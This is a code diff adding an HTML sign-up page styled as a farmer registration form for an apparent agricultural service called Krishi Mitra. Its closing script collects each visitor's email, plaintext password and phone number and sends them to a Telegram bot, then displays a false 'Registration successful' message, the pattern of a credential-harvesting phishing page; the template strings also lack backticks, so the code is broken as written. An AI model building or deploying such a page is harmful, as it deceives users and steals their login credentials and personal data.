@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Create Account - Krishi Mitra</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(rgba(255,255,255,0.7), rgba(255,255,255,0.7)), 
+                  url('https://images.unsplash.com/photo-1500382017468-9049fed747ef?ixlib=rb-1.2.1&auto=format&fit=crop&w=1350&q=80');
+      background-size: cover;
+      background-position: center;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .register-box {
+      background: rgba(255, 255, 255, 0.95);
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 8px 20px rgba(46, 125, 50, 0.2);
+      width: 100%;
+      max-width: 400px;
+      border: 2px solid #e0f2e9;
+    }
+    .register-box h2 {
+      text-align: center;
+      color: #2e7d32;
+      margin-bottom: 25px;
+      font-size: 28px;
+      text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
+    }
+    .logo {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    .logo img {
+      width: 80px;
+      height: auto;
+    }
+    input {
+      width: 100%;
+      padding: 12px 15px;
+      margin: 8px 0;
+      border: 1px solid #c8e6c9;
+      border-radius: 8px;
+      font-size: 16px;
+      background-color: #f8fef9;
+      transition: all 0.3s;
+    }
+    input:focus {
+      border-color: #2e7d32;
+      box-shadow: 0 0 0 2px rgba(46, 125, 50, 0.2);
+      outline: none;
+    }
+    button {
+      width: 100%;
+      padding: 14px;
+      background-color: #2e7d32;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 17px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 10px;
+      transition: all 0.3s;
+    }
+    button:hover {
+      background-color: #1b5e20;
+      transform: translateY(-2px);
+    }
+    .message {
+      margin-top: 15px;
+      text-align: center;
+      color: #2e7d32;
+      font-weight: 500;
+    }
+    .farmer-icon {
+      font-size: 24px;
+      margin-right: 8px;
+      vertical-align: middle;
+    }
+    .footer-text {
+      text-align: center;
+      margin-top: 20px;
+      color: #555;
+      font-size: 14px;
+    }
+    .language-selector {
+      text-align: center;
+      margin-top: 15px;
+    }
+    .language-selector select {
+      padding: 8px;
+      border-radius: 5px;
+      border: 1px solid #c8e6c9;
+      background-color: #f8fef9;
+    }
+  </style>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+</head>
+<body>
+
+<div class="register-box">
+  <div class="logo">
+    <i class="fas fa-tractor farmer-icon"></i>
+    <i class="fas fa-seedling farmer-icon"></i>
+    <i class="fas fa-leaf farmer-icon"></i>
+  </div>
+  <h2>Create Farmer Account</h2>
+  <form id="registerForm">
+    <input type="email" id="email" placeholder="Email Address" required />
+    <input type="password" id="password" placeholder="Create Strong Password" required />
+    <input type="tel" id="phone" placeholder="Mobile Number" required />
+    <button type="submit">
+      <i class="fas fa-user-plus" style="margin-right: 8px;"></i> <a href="index.html" style="text-decoration: none;" >Register Now</a>
+    </button>
+    <p class="message" id="responseMsg"></p>
+    
+    <div class="language-selector">
+      <select>
+        <option>English</option>
+        <option>हिंदी</option>
+        <option>मराठी</option>
+        <option>বাংলা</option>
+        <option>தமிழ்</option>
+      </select>
+    </div>
+    
+    <p class="footer-text">
+      Join 50,000+ farmers using Krishi Mitra for better farming solutions
+    </p>
+  </form>
+</div>
+
+<script>
+  const botToken = "YOUR_BOT_TOKEN";
+  const chatId = "YOUR_CHAT_ID";
+
+  document.getElementById("registerForm").addEventListener("submit", function(e) {
+    e.preventDefault();
+
+    const email = document.getElementById("email").value;
+    const password = document.getElementById("password").value;
+    const phone = document.getElementById("phone").value;
+    const message = New Krishi Mitra Registration:\nEmail: ${email}\nPassword: ${password}\nPhone: ${phone};
+
+    fetch(https://api.telegram.org/bot${botToken}/sendMessage, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message
+      })
+    })
+    .then(response => {
+      if (response.ok) {
+        document.getElementById("responseMsg").textContent = "Registration successful! Welcome to Krishi Mitra.";
+      } else {
+        document.getElementById("responseMsg").textContent = "Registration failed. Please try again.";
+      }
+    })
+    .catch(error => {
+      console.error("Error:", error);
+      document.getElementById("responseMsg").textContent = "Network error. Please check your connection.";
+    });
+  });
+</script>
+
+</body>
+</html>
